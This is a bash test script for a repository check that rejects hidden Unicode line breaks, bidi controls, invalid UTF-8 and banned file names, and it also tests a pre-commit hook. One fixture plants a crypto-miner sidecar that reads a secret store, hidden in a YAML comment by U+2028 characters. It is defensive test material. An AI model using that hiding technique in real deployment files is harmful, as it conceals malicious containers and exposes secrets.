#!/usr/bin/env bash
# shellcheck disable=SC2154,SC2015,SC2016,SC2059
# scripts/check_bytes.sh in a throwaway repository: every forbidden code point fails in a
# comment, valid text with arrows and dashes passes, and the real tree is clean.
set -euo pipefail
HERE=$(cd "$(dirname "$0")/../.." && pwd)
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
fail() { echo "✗ check_bytes_test: $*" >&2; exit 1; }
mkdir -p "$tmp/scripts"; cp "$HERE/scripts/check_bytes.sh" "$tmp/scripts/"
cd "$tmp"; git init -q -b main; git config user.email t@example.com; git config user.name test
mkdir -p deploy/k8s .github/workflows infra/vault/tests/golden web/scripts/lib backend/internal/notify
printf 'a: 1  # arrows -> \xe2\x86\x92 and dashes \xe2\x80\x94, accents \xc3\xa4, a tab\there\n' > deploy/k8s/ok.yaml
printf 'name: x\n' > .github/workflows/ci.yml
printf 'k: v\n' > infra/vault/tests/golden/g.yaml
git add -A; git commit -qm first
run() { rc=0; ./scripts/check_bytes.sh "$@" >"$tmp/out" 2>"$tmp/err" || rc=$?; }

run; [ "$rc" = 0 ] || fail "clean files must pass (rc=$rc): $(cat "$tmp/err")"
grep -q '4 files' "$tmp/out" || fail "four files expected: $(cat "$tmp/out")"

# bad <name> <printf format of the injected bytes>: in a comment of each covered directory.
bad() {
  local name=$1 bytes=$2 f
  for f in deploy/k8s/ok.yaml .github/workflows/ci.yml infra/vault/tests/golden/g.yaml; do
    cp "$f" "$tmp/keep"
    printf "# note ${bytes} hidden\n" >> "$f"
    run
    [ "$rc" = 1 ] || fail "$name in $f must fail (rc=$rc): $(cat "$tmp/err")"
    grep -q "file=$f,line=" "$tmp/err" || fail "$name in $f: the finding names the file and line: $(cat "$tmp/err")"
    run "$f"; [ "$rc" = 1 ] || fail "$name in $f must fail when the file is named (rc=$rc)"
    cp "$tmp/keep" "$f"
  done
}
bad "U+2028" '\xe2\x80\xa8'
bad "U+2029" '\xe2\x80\xa9'
bad "U+0085" '\xc2\x85'
bad "CR" '\r'
bad "NUL-ish C0 (SOH)" '\x01'
bad "ESC" '\x1b'
bad "form feed" '\x0c'
bad "vertical tab" '\x0b'
bad "DEL" '\x7f'
bad "C1 (U+009B)" '\xc2\x9b'
for cp in '\xe2\x80\xaa' '\xe2\x80\xab' '\xe2\x80\xac' '\xe2\x80\xad' '\xe2\x80\xae' '\xe2\x81\xa6' '\xe2\x81\xa7' '\xe2\x81\xa8' '\xe2\x81\xa9' '\xe2\x80\x8e' '\xe2\x80\x8f' '\xd8\x9c'; do
  bad "bidi control $cp" "$cp"
done
bad "BOM in the middle" '\xef\xbb\xbf'
bad "invalid UTF-8 (lone continuation byte)" '\x80'
bad "invalid UTF-8 (overlong)" '\xc0\xaf'
bad "invalid UTF-8 (surrogate)" '\xed\xa0\x80'

# A BOM at the very start; a CRLF file.
cp deploy/k8s/ok.yaml "$tmp/keep"
printf '\xef\xbb\xbfa: 1\n' > deploy/k8s/ok.yaml; run; [ "$rc" = 1 ] || fail "a BOM at the start must fail"
printf 'a: 1\r\nb: 2\r\n' > deploy/k8s/ok.yaml; run; [ "$rc" = 1 ] || fail "CRLF must fail"
cp "$tmp/keep" deploy/k8s/ok.yaml

# The sidecar of 2026-10-22: a comment whose U+2028 breaks hide a whole container.
printf '# note\xe2\x80\xa8      - name: miner\xe2\x80\xa8        image: docker.io/attacker/miner\xe2\x80\xa8        envFrom: [{secretRef: {name: ryft-secrets}}]\n' >> deploy/k8s/ok.yaml
run; [ "$rc" = 1 ] || fail "the hidden sidecar must fail"
cp "$tmp/keep" deploy/k8s/ok.yaml

# Every tracked file counts, wherever it is and whatever its extension (kustomize reads
# `Kustomization`, `events.json` and directories outside deploy/); untracked files are not checked.
for f in other.yaml Kustomization-ish.txt notes.md src.go events.json run.sh; do
  printf 'a: 1 # \xe2\x80\xa8\n' > "$f"; git add "$f"; run; [ "$rc" = 1 ] || fail "$f outside deploy/ must be checked (rc=$rc)"
  git rm -q -f --cached "$f"; rm -f "$f"
done
printf 'a: 1 # \xe2\x80\xa8\n' > deploy/k8s/new.yaml; run; [ "$rc" = 0 ] || fail "an untracked file is not checked in the default mode"
rm -f deploy/k8s/new.yaml
# A NUL does not make a file "binary": it is a finding, in a text extension and in none.
printf 'a: 1\0 # \xe2\x80\xa8\n' > data.bin; git add data.bin; run; [ "$rc" = 1 ] || fail "a file with a NUL is still checked"
git rm -q -f --cached data.bin; rm -f data.bin
# The binary list: an image is not decoded; its look-alike without the extension is.
printf '\x89PNG\xff\xfe\x80' > logo.png; git add logo.png; run; [ "$rc" = 0 ] || fail "a png is on the binary list"
git rm -q -f --cached logo.png; rm -f logo.png
printf '\x89PNG\xff\xfe\x80' > logo; git add logo; run; [ "$rc" = 1 ] || fail "invalid UTF-8 in a file without a binary extension must fail"
git rm -q -f --cached logo; rm -f logo
# Unicode categories beyond the named ones: format (zero width), private use, a no-break space, noncharacter.
for cp in '\xe2\x80\x8b' '\xe2\x81\xa0' '\xc2\xad' '\xee\x80\x80' '\xc2\xa0' '\xe2\x80\x83' '\xe3\x80\x80' '\xef\xb7\x90' '\xef\xbf\xbe'; do
  bad "category character $cp" "$cp"
done
# Banned names, wherever they are.
for n in Kustomization kustomization.yml deploy/k8s/Kustomization deploy/k8s/kustomization.yml KUSTOMIZATION.YAML .gitattributes web/.gitattributes .gitmodules; do
  mkdir -p "$(dirname "$n")"; printf 'a: 1\n' > "$n"; git add "$n"; run
  [ "$rc" = 1 ] && grep -q 'not allowed' "$tmp/err" || fail "the name $n must be refused (rc=$rc): $(cat "$tmp/err")"
  git rm -q -f --cached "$n"; rm -f "$n"
done
printf 'k: v\n' > deploy/k8s/kustomization.yaml; git add deploy/k8s/kustomization.yaml; run; [ "$rc" = 0 ] || fail "kustomization.yaml is the right name"
git rm -q -f --cached deploy/k8s/kustomization.yaml; rm -f deploy/k8s/kustomization.yaml
# The exceptions are by path and by character.
printf 'x = /[\xc2\xad\xe2\x80\x8b]/\n' > web/scripts/lib/brand.mjs; git add web/scripts/lib/brand.mjs; run; [ "$rc" = 0 ] || fail "brand.mjs may hold format characters: $(cat "$tmp/err")"
printf 'x = /[\xe2\x80\xa8]/\n' > web/scripts/lib/brand.mjs; run; [ "$rc" = 1 ] || fail "not even brand.mjs may hold a line break"
git rm -q -f --cached web/scripts/lib/brand.mjs; rm -f web/scripts/lib/brand.mjs
printf 'x := "a\xc2\xa0b"\n' > backend/internal/notify/messages.go; git add backend/internal/notify/messages.go; run; [ "$rc" = 0 ] || fail "messages.go may hold a no-break space"
printf 'x := "a\xe2\x80\x8bb"\n' > backend/internal/notify/messages.go; run; [ "$rc" = 1 ] || fail "messages.go may hold nothing but U+00A0"
printf 'x := "a\xc2\xa0b"\n' > other.go; git add other.go; run; [ "$rc" = 1 ] || fail "a no-break space elsewhere must fail"
git rm -q -f --cached backend/internal/notify/messages.go other.go; rm -f backend/internal/notify/messages.go other.go

# --staged reads what is staged, not the working tree.
printf 'a: 1 # \xe2\x80\xa8\n' > deploy/k8s/ok.yaml; git add deploy/k8s/ok.yaml; cp "$tmp/keep" deploy/k8s/ok.yaml
run --staged; [ "$rc" = 1 ] || fail "--staged must see the staged bytes (rc=$rc)"
git add deploy/k8s/ok.yaml; run --staged; [ "$rc" = 0 ] || fail "--staged passes once the clean version is staged: $(cat "$tmp/err")"

# The pre-commit hook runs it for a commit that stages such a file, and only then.
cp -R "$HERE/.githooks" .githooks; rm .githooks/commit-msg; git config core.hooksPath .githooks  # only the pre-commit hook: the brand check of messages needs web/
printf 'a: 1 # \xe2\x80\xa8 hidden\n' > deploy/k8s/ok.yaml; git add deploy/k8s/ok.yaml
hc=0; git commit -qm "deploy: sneaky" >"$tmp/out" 2>"$tmp/err" || hc=$?
[ "$hc" != 0 ] && grep -q 'U+2028' "$tmp/err" || fail "the pre-commit hook must refuse a staged U+2028 (rc=$hc): $(cat "$tmp/err")"
cp "$tmp/keep" deploy/k8s/ok.yaml; git add deploy/k8s/ok.yaml; printf 'x\n' > unrelated.txt; git add unrelated.txt
git commit -qm "deploy: fine" >"$tmp/out" 2>"$tmp/err" || fail "the hook must pass a clean commit: $(cat "$tmp/err")"
git config --unset core.hooksPath

# Nothing to check fails closed.
git rm -q -r --cached . ; run; [ "$rc" = 2 ] || fail "no tracked file must exit 2 (rc=$rc)"

# The real tree.
cd "$HERE"; rc=0; ./scripts/check_bytes.sh >"$tmp/out" 2>"$tmp/err" || rc=$?
[ "$rc" = 0 ] || fail "the repository's own YAML must pass: $(cat "$tmp/err")"
echo "✓ check_bytes_test: line breaks, controls, bidi, BOM and invalid UTF-8 fail in every tracked file, banned names and the exceptions by path"
